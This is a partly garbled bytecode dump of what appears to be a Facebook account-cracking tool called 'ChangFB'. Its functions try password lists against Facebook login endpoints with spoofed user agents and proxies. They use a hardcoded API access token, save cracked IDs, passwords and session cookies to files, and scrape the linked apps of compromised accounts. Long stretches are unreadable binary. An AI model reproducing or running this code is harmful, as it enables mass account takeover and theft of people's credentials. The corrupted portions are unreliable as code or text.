�w�w�I�#�M�  Oy�  y�  z�  z�1���5�s�1�6�{�{�C�C�I�I�!�L�L�WY�W`�a�  BE�  FG�  FL�  BM�  BM�  XN�  XN�  XT�  XT�  UV�  XW�  XW�  ^a�  iM�  Uc�  km�  o�  o�5��*�*�^�^��	�@R�@R�@T�@T�@Z�@Z�@\�@\�^�^�^�
_�
_�4��	+�+�4� 
^�&�"�  
^�?�K�  
^��Mw�  
^�  yK�  MQ�  
^�  Rf�  hs�  
^�  tO�  QT�  
^�  U]�  _w�  
^�  xF�  Hk�  
^�  lx�  z|�  
^�  }E�  GP�  
^�  Qc�  eu�  
^�  vF�  HU�  
^�  Vf�  hn�  
^�  o�  A	H	�  
^�  I	R	�  T	N
�  O
R
�  T	R
�  S
}�  T	}�  
^�  ~O�  Qd�  
^�  ev�  x]�  
^�5����d�jo�  zB�  DH�  yI�  RW�  hm�  v{��  	|�  	|�2��b�j�)�)�+�+�0�0�2�2�2�2�	�
O�q�
O�#�
O�
O�"�
O�a�
O�
O��
O�A�
O�
O�P�P�P���s��3�����c�'�k�"�n�T�1�2�2�2��K�K��G��B�������E�B�	�E��C�K�(�(�*�*�/�/�1�1�1�1���E�B�	��	�	�	�	�D��:�:�a�a���AU�AU�AW�AW�A]�A]�A_�A_�a�a�a�b�b�D�	�
n�q�
n�#�
n�
n�"�
n�
n�D�
n�
n�gi�
n�kl�
n�
n�o�o�o���s��3�����c�#�g�b�j��n�R�/��4�5�5�5��G�D����	�E� ��	�	�	,� � � ��:�b�>�>�>�>�>������q����s   �H6Q�
DQ�(R
�	R
c                 �"  � t          j        t          t          t          t
          t          t          g�  �        }t          dz  t          t          �  �        z  }d}t          d|�dt          �dt          t          �  �        �dt          �dt          �dt          |�  �        �t          |�  �        �d	t           ��d
��  �         t"          j        �                    �   �          t          j        t(          �  �        }d}d}|D �]}	 t          j        t*          �  �        }dd|z   i}	t,          j        �                    dddd|dddddd�
�  �         t,          �                    d| z   dz   �  �        }
t5          j        dt          |
j        �  �        �  �        �                    d�  �        t5          j        dt          |
j        �  �        �  �        �                    d�  �        | dd|d �}d!�                    d"� |
j        �                     �   �         �!                    �   �         D �   �         �  �        }|d#z  }i d$d�d%d�d&d'�d(d�d)d*�d+d�d,d-�d.d/�d0|�d1d�d2d3�d4d�d5d�d6d�d7d| z   dz   �d8d9�d:d�}t,          �"                    d;|d<|i|d=|	�>�  �        }d?|j        �                     �   �         �#                    �   �         v r�d@tH          v r1tJ          �&                    | dAz   |z   �  �         tO          | |�  �         n�d@tP          v r�t          dB�  �         dC| � dD|� �}tS          |dE�F�  �        }tU          tS          |dG�H�  �        �  �         tW          dItX          z   dJ�  �        �-                    | dAz   |z   dBz   �  �         tJ          �&                    | dAz   |z   �  �         t          dz  an��� �n[dKt,          j        �                     �   �         �#                    �   �         v �r�d0dLi}dMt\          v r�|j        �                     �   �         }d!�                    dN� t,          j        �                     �   �         �!                    �   �         D �   �         �  �        }tW          dOt^          z   dJ�  �        �-                    | dAz   |z   dAz   |z   dBz   �  �         t          dB�  �         dP| � dD|� dQ|� �}tS          |dR�F�  �        }tU          tS          |dS�H�  �        �  �         t          dz  a �n%d@t\          v �r�|j        �                     �   �         }d!�                    dT� t,          j        �                     �   �         �!                    �   �         D �   �         �  �        }tW          dOt^          z   dJ�  �        �-                    | dAz   |z   dAz   |z   dBz   �  �         | }dU}ta          j1        �   �         }|�                    dV||�W�  �        j        }|�                    dX||�W�  �        j        }|dYz  }t5          j2        dZt          |�  �        �  �        }d}|D ]"}|d[|� d\|d]         � d
|d         � d^�z  }|dz  }�#d]}|d_z  }t5          j2        dZt          |�  �        �  �        }d]}|D ]"}|dz  }|d`|� d\|d]         � d
|d         � d^�z  }�#t          dB�  �         da| � db|� dc|� d^|� �}tS          |dd�F�  �        }tU          tS          |de�H�  �        �  �         t          dz  a n4n��Ր��# t`          j3        j4        $ r tk          j6        df�  �         Y ��w xY wt          dz  ad S )gNrK   r*  u   └───[u'   ❨•ᴥ•❩[m] [38;5;248m[[1;95mz[38;5;248m/[38;5;208mz[38;5;248m][1;96m[OK:[z]-[[1;96mCRACK:[z] [38;5;248m[[0;91mz[38;5;248m]rM   ra  r�  r;  z	socks4://r=  r>  r?  r/   r@  rA  rB  rC  rD  rE  rO  rP  rQ  r   rR  rS  rT  rU  r[  c                 �"   � g | ]\  }}|�d |����S r]  r�   r^  s      r   rb  zmobilev5.<locals>.<listcomp>�  rc  r   rd  rF  rG  re  rf  rH  rg  rh  rI  ri  rj  rk  rl  r;  rJ  rm  rn  rK  rL  rM  ro  rp  rq  rN  rr  r�   Frs  rv  r�  r  rx   u   ├───➣ r�  r  r  rx  r  z/sdcard/ChangFB/CP/r�   r|  z{NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+�noc                 �"   � g | ]\  }}|�d |����S r]  r�   r^  s      r   rb  zmobilev5.<locals>.<listcomp>�  �'   � �b�b�b�J�C��C�C�C���/�b�b�br   z/sdcard/ChangFB/OK/u   ├──╭➣ r�  r  r  c                 �"   � g | ]\  }}|�d |����S r]  r�   r^  s      r   rb  zmobilev5.<locals>.<listcomp>�  r�  r   rC   �>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactiver�  �<https://mbasic.facebook.com/settings/apps/tabbed/?tab=activeu<   
[bold green][•] LIST ACTIVE APPLICATIONS :[/bold green] 
�`</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>z[bold green[r  r   �[/bold yellow]
u;   
[bold red][•] LIST EXPIRED APPLICATIONS :[/bold yellow]
�[bold yellow][u   [bold red][•] ID   : �   
[•] PASSWORD : �   
[•] COOKIES  : r�  z [bold green]ChangOK[/bold green]r   )7r�   r�   r�   r�   �kkr�   r�   �hhr�  r
   r�  r   r�  r�  rN  r   r�   r�   r�   r�   r|   r�  r�   r>  r  r   r�   r�   r�   r�   r�   r�   r�  r�  r�  r�  �oprekr�  r}   �ceker�princpr�   r�   ry   r   r�   �	taplikasir�  r~   r�   r�   r�   r�   r�   r�   ) r
  r  r�  r�  r�  r�   r�  r�  r�  r�  r�   r�  r�  r�  r�  �statuscp�	statuscp1�headappr�  r�  �statusok�	statusok1�user�infoakunr�  �cek2�cek�apkaktif�nok�muncul�hit�apkexps                                    r   r�  r�  �  s�	  � ��m�Q�q��A�a��O�$�$���S���S�����
����  SU�  SU�  SU�  VZ�  VZ�  VZ�  [^�  _b�  [c�  [c�  [c�  [c�  df�  df�  df�  gi�  gi�  gi�  jm�  nr�  js�  js�  js�  tw�  x{�  t|�  t|�  t|�  t|�  }~�  }~�  �  EH�  I�  I�  I�  I�  JM�  JT�  JZ�  JZ�  J\�  J\�  J\��m�D���� c�� d��� G� G�R�F��}�T���3��;�s�?�
#�5��;���/��ae�  DG�  VX�  cl�  L�  _e�  x�  Sx�  y�  y�  z�  z�  z�
�w�w�I�#�M�  Oy�  y�  z�  z�1���5�s�1�6�{�{�C�C�I�I�!�L�L�WY�W`�a�  BE�  FG�  FL�  BM�  BM�  XN�  XN�  XT�  XT�  UV�  XW�  XW�  ^a�  iM�  Uc�  km�  o�  o�5��*�*�^�^��	�@R�@R�@T�@T�@Z�@Z�@\�@\�^�^�^�
_�
_�4��	+�+�4� 
^�&�"�  
^�?�K�  
^��Mw�  
^�  yK�  MQ�  
^�  Rf�  hs�  
^�  tO�  QT�  
^�  U]�  _w�  
^�  xF�  Hk�  
^�  lx�  z|�  
^�  }E�  GP�  
^�  Qc�  eu�  
^�  vF�  HU�  
^�  Vf�  hn�  
^�  o�  A	H	�  
^�  I	R	�  T	N
�  O
R
�  T	R
�  S
}�  T	}�  
^�  ~O�  Qd�  
^�  ev�  x]�  
^�5����d�jo�  zB�  DH�  yI�  RW�  hm�  v{��  	|�  	|�2��b�j�)�)�+�+�0�0�2�2�2�2��u�}�}�	�[�[��S�������
�3�r�]�]�]�]�	����
�4�[�[�[�/�3�/�/�2�/�/�X��X�X�.�.�.�Y�
�3�y�	�*�*�*�+�+�+�	�
��
#�C�(�(�.�.�s�3�w�r�z�$��?�?�?�	�[�[��S���������U�R�R�	�	�E��C�K�(�(�*�*�/�/�1�1�1�1��  X�  Y�G��y���
�*�
�
�
�
�T��J�J�b�b�#�+�BV�BV�BX�BX�B^�B^�B`�B`�b�b�b�c�c�T�	�
��
#�C�(�(�.�.�s�3�w�r�z�#�~�d�/B�4�/G�H�H�H�
�4�[�[�[�L�3�L�L�2�L�L�d�L�L�X��X�W�-�-�-�Y�
�3�y�	�*�*�*�+�+�+���U�R�
�U�	��	�	�
�*�
�
�
�
�T��J�J�b�b�#�+�BV�BV�BX�BX�B^�B^�B`�B`�b�b�b�c�c�T�	�
��
#�C�(�(�.�.�s�3�w�r�z�#�~�d�/B�4�/G�H�H�H�
�T��X���!�!�W��K�K�X�ae�nu�K�v�v�{�T�
�+�+�T�]a�jq�+�
r�
r�
w�S��S�T�X��j�{�|�  AD�  }E�  }E�  F�  F�X�	
�S�� � ���O��O�O��q�	�O�O�F�1�I�O�O�O�P�h�	�1�f�c�c�	
�S��R�S�X��J�y�z}�  C�  {D�  {D�  E�  E�V�	
�S�� T� T��	�1�f�c��R�C�R�R�6�!�9�R�R�v�a�y�R�R�R�S�h�h�
�4�[�[�[�y�#�y�y�"�y�y�Y]�y�y�ow�y�y�X��X�U�+�+�+�Y�
�3�y� B�C�C�C�D�D�D���U�R�
�U�9 
�@ �A 
��B 
�	�	,� � � ��:�b�>�>�>�>�>������q����s'   �J"[�*D3[� G/[�[�(\�\c                 �\  � t          j        t          t          t          t
          t          t          g�  �        }t          dz  t          t          �  �        z  }d}t          d|�dt          �dt          t          �  �        �dt          �dt          �dt          |�  �        �t          |�  �        �d	t           �d
�d��  �         t"          j        �                    �   �          t          j        g d��  �        }t          j        g d��  �        }t          d|�dt          �dt          t          �  �        �dt          �dt          �dt          |�  �        �t          |�  �        �d	t           �d�d��  �         t"          j        �                    �   �          t          j        g d��  �        }t          j        g d��  �        }t)          j        �   �         }t          j        g d��  �        }t          j        g d��  �        }|D �]}	 t          t          j        dd�  �        �  �        t          t          j        dd�  �        �  �        t          t          j        dd�  �        �  �        dd|ddd�}	|�                    dt          | �  �        z   d z   t          |�  �        z   d!z   |	�"�  �        }
d#|
�                    �   �         d$         v r�d%t2          v r1t4          �                    | d&z   |z   �  �         t9          | |�  �         n|t          dt
          �d'| �d(|�d)��  �         t;          d*t<          z   d+�  �        �                    | d&z   |z   d,z   �  �         t4          �                    | d&z   |z   �  �         t          d-z  a n�d.|
j         v rgd/|
j         v r^t          dt          �d0| �d(|�d)��  �         t;          d1tB          z   d+�  �        �                    | d&z   |z   d,z   �  �         t          d-z  a n1���# t(          j"        j#        $ r tI          j%        d2�  �         Y ��w xY wt          d-z  ad S )3NrK   r*  r_  �    [Ahmad]-[re   �]-[OK/�]-[CP/r�  r�   r1  rM   ra  ��6https://github.com/ChangJr7/Chang/blob/main/Chrome.txt�xMozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36r4  r5  �r7  r8  ��Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36r9  r:  z    [CHANG]-[z] [OK:r�  �   √)z�Mozilla/5.0 (Linux; U; Android 8.1.0; DRA-LX5 Build/HUAWEIDRA-LX5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069z�Mozilla/5.0 (Linux; Android 11; TECNO PR651H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.134 Mobile Safari/537.36 OPR/70.3.3653.66287z�Mozilla/5.0 (Linux; U; Android 8.1.0; ASUS_X00TD Build/OPM1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069r2  r6  �    �sA�    8�|A� N  �@�  �	EXCELLENT�!cell.CTRadioAccessTechnologyHSDPArl  �Liger�zx-fb-connection-bandwidthzx-fb-sim-hnizx-fb-net-hnizx-fb-connection-qualityzx-fb-connection-typer;  rk  zx-fb-http-engine�?https://b-api.facebook.com/method/auth.login?format=json&email=�
&password=�  &credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=truer=  �www.facebook.com�	error_msgr�  r  z	    [CP] ry  �        r  r�   rx   r   �session_key�EAABz	    [OK] r  r   )&r�   r�   r�   r�   r�  r�   r�   r�  r�  r
   r�  r   r�  r�  rN  r   r�   r�   r�   r�   r~   r�   r�  r   r�   r�  r�  r}   r�  ry   r   r�   r�   r�  r�   r�   r�   r�   �r
  r  r�  r�  r�  r�   r�  r�   r�  �head�resps              r   r�  r�  �  s�  � ��m�Q�q��A�a��O�$�$���S���S�����
����b�b�b����c�#�h�h�h�h�r�r�r�RT�RT�RT�UX�Y]�U^�U^�U^�_b�cf�_g�_g�_g�_g�hi�hi�hi�j�ps�t�t�t�t�ux�u�  vF�  vF�  vH�  vH�  vH��m� � � � � �� �}� � � � � �� ��b�b�b����c�#�h�h�h�h�r�r�r�RT�RT�RT�UX�Y]�U^�U^�U^�_b�cf�_g�_g�_g�_g�hi�hi�hi�j�ps�t�t�t�t�ux�u�  vF�  vF�  vH�  vH�  vH��m�  \�  \�  \�  ]�  ]���}�  ]�  ]�  ]�  ^�  ^��������m� � � � � �� �}� � � � � �� � � �R��(+�F�N�:�z�,R�,R�(S�(S�eh�io�iw�x}�  @E�  jF�  jF�  fG�  fG�  Y\�  ]c�  ]k�  lq�  sx�  ]y�  ]y�  Yz�  Yz�  Wb�  |_�  oq�  Cf�  |C�  D�  D�4�
�'�'�S�TW�X[�T\�T\�\�]i�i�jm�np�jq�jq�q�  sc�  c�  mq�'�  r�  r�4��D�I�I�K�K��4�4�4��u�}�}�	�[�[��S�������
�3�r�]�]�]�]�
�U�1�1�1�S�S�S����4�5�5�5�	�%��)�C�����s�3�w�r�z�$��/�/�/�	�[�[��S���������U�R�	�E����"�"�v���':�':�	�E�!�!�!�C�C�C����
3�4�4�4���s��3�����c�#�g�b�j��o�.�.�.���E�B�	�E���	�	�	,� � � ��:�b�>�>�>�>�>������q����s   �E:O3�A.O3�3(P�Pc                 ��	  � t          j        t          t          t          t
          t          t          g�  �        }t          dz  t          t          �  �        z  }d}t          d|�dt          �dt          t          �  �        �dt          �dt          �dt          |�  �        �t          |�  �        �d	t           �d
�d��  �         t"          j        �                    �   �          t          j        t(          �  �        �                    dd�  �        }t-          j        �   �         }t"          j        �                    d|�dt          �dt          t          �  �        �dt          �dt          �dt          |�  �        �t          |�  �        �d	t           �d��  �         t"          j        �                    �   �          t          j        g d��  �        }t          j        g d��  �        }t-          j        �   �         }t          d|�dt          �dt          t          �  �        �dt          �dt          �dt          |�  �        �t          |�  �        �d	t           �d�d��  �         t"          j        �                    �   �          d}d}t-          j        �   �         }|D �]Z}	 t          t          j        dd�  �        �  �        t          t          j        dd�  �        �  �        t          t          j        dd�  �        �  �        dd|ddd�}	t          j        t4          �  �        }
dd |
z   i}|�                    d!t          | �  �        z   d"z   t          |�  �        z   d#z   |	�$�  �        }d%|�                    �   �         d&         v r�d't:          v r1t<          �                    | d(z   |z   �  �         tA          | |�  �         n|t          dt
          �d)| �d*|�d+��  �         tC          d,tD          z   d-�  �        �                    | d(z   |z   dz   �  �         t<          �                    | d(z   |z   �  �         t          d.z  a n�d/|j#        �$                    �   �         �%                    �   �         v r^t          dt          �d0| �d*|�d+��  �         tC          d1tL          z   d-�  �        �                    | d(z   |z   dz   �  �         t          d.z  a n1��-# t,          j'        j(        $ r tS          j*        d2�  �         Y ��Xw xY wt          d.z  ad S )3NrK   r*  r_  u	      😆 [re   r�  r�  r�  r�   u   ✓ rM   ra  rx   rC   u	      😁 [r�  r�  r2  r6  u	      🙂 [r�  r�  r�  r�  r�  r�  r�  rl  r�  r�  r;  r<  r�  r�  r�  r=  r�  r�  r�  r  z
     [CP] ry  �       r  r�   r   r|  z
     [OK] r  r   )+r�   r�   r�   r�   r�  r�   r�   r�  r�  r
   r�  r   r�  r�  rN  r   r�   r�   r�   r�   r|   rK  r~   r�   r�   r�  r�  r   r�   r�  r�  r}   r�  ry   r   r�   r�  r�  r�  r�   r�   r�   r�   )r
  r  r�  r�  r�  r�   r�   r�  r�  r�  r�  r�  r�  s                r   r�  r�    s0  � ��m�Q�q��A�a��O�$�$���S���S�����
����"�"�"�T�T�T�#�c�(�(�(�(�2�2�2�b�b�b�QT�UY�QZ�QZ�QZ�[^�_b�[c�[c�[c�[c�de�de�de�f�lo�p�p�p�p�qt�q{�  rB�  rB�  rD�  rD�  rD��m�D���!�!�$�r�*�*������������2�2�2�d�d�d�3�s�8�8�8�8�TV�TV�TV�WY�WY�WY�Z]�^b�Zc�Zc�Zc�dg�hk�dl�dl�dl�dl�mn�mn�mn�o�p�p�p�qt�q{�  rB�  rB�  rD�  rD�  rD��m� � � � � �� �}� � � � � �� �������b�b�b����c�#�h�h�h�h�r�r�r�"�"�"�S�QU�Y�Y�Y�WZ�[^�W_�W_�W_�W_�`a�`a�`a�b�hk�l�l�l�l�mp�mw�m}�m}�m�m�m� c�� d�������� � �R��(+�F�N�:�z�,R�,R�(S�(S�eh�io�iw�x}�  @E�  jF�  jF�  fG�  fG�  Y\�  ]c�  ]k�  lq�  sx�  ]y�  ]y�  Yz�  Yz�  Wb�  |_�  oq�  Cf�  |C�  D�  D�4��}�T���3��;�s�?�
#�5�
�'�'�S�TW�X[�T\�T\�\�]i�i�jm�np�jq�jq�q�  sc�  c�  mq�'�  r�  r�4��D�I�I�K�K��4�4�4��u�}�}�	�[�[��S�������
�3�r�]�]�]�]�
�U�1�1�1�S�S�S����4�5�5�5�	�%��)�C�����s�3�w�r�z�$��/�/�/�	�[�[��S���������U�R�	�E��C�K�(�(�*�*�/�/�1�1�1�1�	�E�!�!�!�C�C�C����
3�4�4�4���s��3�����c�#�g�b�j��o�.�.�.���E�B�	�E���	�	�	,� � � ��:�b�>�>�>�>�>������q����s   �FS�5B	S�(S.�-S.c                 �z  � t          j        dg�  �        }t          dz  t          t          �  �        z  }d}t          d|�dt          �dt          t          �  �        �dt          �dt          �d	t          |�  �        �t          |�  �        �d
t          ��d��  �         t          j        �                    �   �          d}d}t          j        �   �         }|D �]Y}	 |j        �                    dd|ddddddddddd��  �         |�                    d�  �        j        }	t)          j        dt          |	�  �        �  �        �                    d�  �        t)          j        dt          |	�  �        �  �        �                    d�  �        | d|dd �}
|j        �                    dd!dd"d#|ddddddd$ddd%��  �         |�                    d&|
d'�(�  �        }d)|j        �                    �   �         �                    �   �         v r�t          d*t6          � d+t8          � d,t6          � | � d-|� �	�  �         t          d*t:          � |� t:          � d.��  �         t=          d/t>          z   d0�  �        �                     | d1z   |z   d.z   �  �         tB          �"                    | d1z   |z   �  �         t          dz  a �n�d2|j        �                    �   �         �                    �   �         v �r*t          dz  a|j        �                    �   �         }d3�#                    d4� |j        �                    �   �         �$                    �   �         D �   �         �  �        }t          d*tJ          � d5t8          � d6tJ          � d| � d-|� �
�  �         t          d*tJ          � |� tJ          � ��  �         t          d*t:          � |� t:          � d.��  �         t=          d7tL          z   d0�  �        �                     | d1z   |z   d1z   |z   d.z   �  �         tO          tP          |�  �          n1��,# t          j)        j*        $ r tW          j,        d8�  �         Y ��Ww xY wt          dz  ad S )9Nr�   rK   r*  �   [1;97m╰───[zFREE[1;97m][[95mre   �[1;97m][[1;92mOK:�[1;97m]-[[1;96mCP:z[1;97m][[1;91m�[1;97m]rM   ra  r3  �free.facebook.comr/   r�  r�  rA  rB  rC  r�  r�  r�  r�  r�  a�  https://free.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5ab7d53-0810-47b0-8640-39adfbf98cfd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdrrQ  r   rR  rT  r�  r�  r>  rj  rl  r�  r�  �Fhttps://free.facebook.com/login/device-based/validate-password/?shbl=0Fr�  rv  �   [1;97m├───[r
  r  ry  rx   r  r�   r  r|  r[  c                 �"   � g | ]\  }}|�d |����S r]  r�   r^  s      r   rb  zfree.<locals>.<listcomp>b  r~  r   r  r�   r  r   )-r�   r�   r�  r
   r�  r   r�  r�  rN  r   r�   r�   r�   r�   r~   r�   r>  r  r   r�   r�   r�   r�   r�  r�   r�  r�  r*   rW   r2   ry   r   r�   r�  r}   r�   r�  rR   r�  r�  r�  r�   r�   r�   r�   r�  s                 r   r�  r�  G  s�  � ��m�W�I�����S���S�����
����  ac�  ac�  ac�  dh�  dh�  dh�  il�  mp�  iq�  iq�  iq�  iq�  rt�  rt�  rt�  uw�  uw�  uw�  x{�  |@�  xA�  xA�  xA�  BE�  FI�  BJ�  BJ�  BJ�  BJ�  KL�  KL�  M�  SV�  W�  W�  W�  W�  X[�  Xb�  Xh�  Xh�  Xj�  Xj�  Xj� T�� U�������� � �R���;���1�c�_b�  mM�  TW�  kx�  JW�  io�  AH�  Zd�  oH�  [m�  @	\	�  ]	�  ]	�  ^	�  ^	�  ^	�
�w�w�  t�  u�  u�  z�1���5�s�1�v�v�>�>�D�D�Q�G�G�RT�R[�\z�|�  AB�  }C�  }C�  SD�  SD�  SJ�  SJ�  KL�  SM�  SM�  TW�  _m�  uw�  y�  z�  z�5��;���1�+�jm�  xP�  `C�  QS�  ]}�  Q^�  p}�  OU�  gn�  @	J	�  U	C�  Vh�  {W�  X�  X�  Y�  Y�  Y����Y�_d�uz��{�{�2��b�j�)�)�+�+�0�0�2�2�2�2�	�
?�a�
?�
?�1�
?�
?��
?�3�
?�
?�2�
?�
?�@�@�@�	�
2�a�
2��
2�Q�
2�
2�
2�3�3�3���s��3�����c�#�g�b�j��o�.�.�.��K�K��C���
������E�B�	�E��C�K�(�(�*�*�/�/�1�1�1�1���E�B�	��	�	�	�	�D��:�:�a�a���AU�AU�AW�AW�A]�A]�A_�A_�a�a�a�b�b�D�	�
?�a�
?�
?�1�
?�
?�q�
?�
?�3�
?�
?�2�
?�
?�@�@�@�	�
2�a�
2��
2�q�
2�
2�3�3�3�	�
2�a�
2��
2�Q�
2�
2�
2�3�3�3���s��3�����c�#�g�b�j��n�T�1�$�6�7�7�7��G�D����	�E� ��	�	�	,� � � ��:�b�>�>�>�>�>������q����s   �GP�(EP�(P.�-P.c                 �0	  � t          j        dg�  �        }t          dz  t          t          �  �        z  }d}t
          j        �                    d|�dt          �dt          t          �  �        �dt          �dt          �d	t          |�  �        �t          |�  �        �t          �d
��  �         t
          j        �                    �   �          t          j        g d��  �        }t          j        g d��  �        }t          j        �   �         }|D �]~}	 t          j        t           �  �        }	dd|	z   i}
|j        �                    dddd|dddddd�
�  �         |�                    d| z   dz   �  �        }t)          j        dt          |j        �  �        �  �        �                    d�  �        t)          j        dt          |j        �  �        �  �        �                    d�  �        | dd|d �}d!�                    d"� |j        �                    �   �         �                    �   �         D �   �         �  �        }|d#z  }i d$d�d%d�d&d'�d(d�d)d*�d+d�d,d-�d.d/�d0|�d1d�d2d3�d4d�d5d�d6d�d7d| z   dz   �d8d9�d:d�}|�                    d;|d<|i|d=|
�>�  �        }d?|j        �                    �   �         �                    �   �         v r�t=          d@t>          � | � dA|� t@          � dB|� tB          � �	�  �         tE          dCtF          z   dD�  �        �                    | dEz   |z   dFz   �  �         tH          �%                    | dEz   |z   �  �         t          dz  a	 �nCdG|j        �                    �   �         �                    �   �         v r�t          dz  a|j        �                    �   �         }d!�                    dH� |j        �                    �   �         �                    �   �         D �   �         �  �        }t=          d@tL          � | � dA|� dB|� dB|� tB          � �
�  �         tE          dItN          z   dD�  �        �                    | dAz   |z   dAz   |z   dFz   �  �         tQ          tR          |�  �          n1��Q# t          j*        j+        $ r tY          j-        dJ�  �         Y ��|w xY wt          dz  ad S )KNr�   rK   r*  r_  u   🕞u   🐍u	    🐍 OK:u	    🐍 CP:u    🐍 r�  r2  r6  r;  r<  r=  r>  r?  r/   r@  rA  rB  rC  rD  rE  rO  rP  rQ  r   rR  rS  rT  rU  r[  c                 �"   � g | ]\  }}|�d |����S r]  r�   r^  s      r   rb  ztouch.<locals>.<listcomp>�  rc  r   rd  rF  rG  re  rf  rH  rg  rh  rI  ri  rj  rk  rl  r;  rJ  rm  rn  rK  rL  rM  ro  rp  rq  rN  rr  r�   Frs  rv  �   ├──> r  �   
└──> r  r�   r{  rx   r|  c                 �"   � g | ]\  }}|�d |����S r]  r�   r^  s      r   rb  ztouch.<locals>.<listcomp>�  r~  r   r  r   ).r�   r�   r�  r
   r�  r�   r�   r�   r�  r�  rN  r   r�   r�   r~   r�   r�  r>  r  r   r�   r�   r�   r�   r�   r�   r�  r�  r�  r�  r   rU   r8   r2   ry   r   r�  r}   rR   r�  r�  r�  r�   r�   r�   r�   r�  s                     r   r�  r�  q  se  � ��m�W�I�����S���S�����
�������2�2�2�d�d�d�SV�WZ�S[�S[�S[�S[�\^�\^�\^�_a�_a�_a�be�fj�bk�bk�bk�lo�ps�lt�lt�lt�uv�uv�uv�w�x�x�x�y|�  zD�  zJ�  zJ�  zL�  zL�  zL��m� � � � � �� �}� � � � � �� ������ � �R���}�T���3��;�s�?�
#�5��;���/��ae�  DG�  VX�  cl�  L�  _e�  x�  Sx�  y�  y�  z�  z�  z�
�w�w�I�#�M�  Oy�  y�  z�  z�1���5�s�1�6�{�{�C�C�I�I�!�L�L�WY�W`�a�  BE�  FG�  FL�  BM�  BM�  XN�  XN�  XT�  XT�  UV�  XW�  XW�  ^a�  iM�  Uc�  km�  o�  o�5��*�*�^�^��	�@R�@R�@T�@T�@Z�@Z�@\�@\�^�^�^�
_�
_�4��	+�+�4� 
^�&�"�  
^�?�K�  
^��Mw�  
^�  yK�  MQ�  
^�  Rf�  hs�  
^�  tO�  QT�  
^�  U]�  _w�  
^�  xF�  Hk�  
^�  lx�  z|�  
^�  }E�  GP�  
^�  Qc�  eu�  
^�  vF�  HU�  
^�  Vf�  hn�  
^�  o�  A	H	�  
^�  I	R	�  T	N
�  O
R
�  T	R
�  S
}�  T	}�  
^�  ~O�  Qd�  
^�  ev�  x]�  
^�5����d�jo�  zB�  DH�  yI�  RW�  hm�  v{��  	|�  	|�2��b�j�)�)�+�+�0�0�2�2�2�2�	�
>�!�
>�S�
>�
>�2�
>�q�
>�
>�r�
>�1�
>�
>�?�?�?���s��3�����c�'�k�"�n�T�1�2�2�2��K�K��G��B�������E�B�	�E��C�K�(�(�*�*�/�/�1�1�1�1���E�B�	��	�	�	�	�D��:�:�a�a���AU�AU�AW�AW�A]�A]�A_�A_�a�a�a�b�b�D�	�
N�!�
N�S�
N�
N�2�
N�
N�D�
N�
N�r�
N�1�
N�
N�O�O�O���s��3�����c�#�g�b�j��n�R�/��4�5�5�5��G�D����	�E� ��	�	�	,� � � ��:�b�>�>�>�>�>������q����s   �H6Q�	DQ�(R	�R	c                 �\  � t          j        t          t          t          t
          t          t          g�  �        }t          dz  t          t          �  �        z  }d}t          j        t          �  �        }dd|z   i}t          j        t          �  �        }t          j        t          �  �        }t          j        �   �         }	t           j        �                    d|�dt          �dt          t          �  �        �dt&          �d	t(          �d
t+          |�  �        �t-          |�  �        �dt.          �d��  �         t           j        �                    �   �          |D �]�}
	 |	j        �                    dddd|dddddd�
�  �         |	�                    d| z   dz   �  �        }t9          j        dt-          |j        �  �        �  �        �                    d�  �        t9          j        dt-          |j        �  �        �  �        �                    d�  �        | dd|
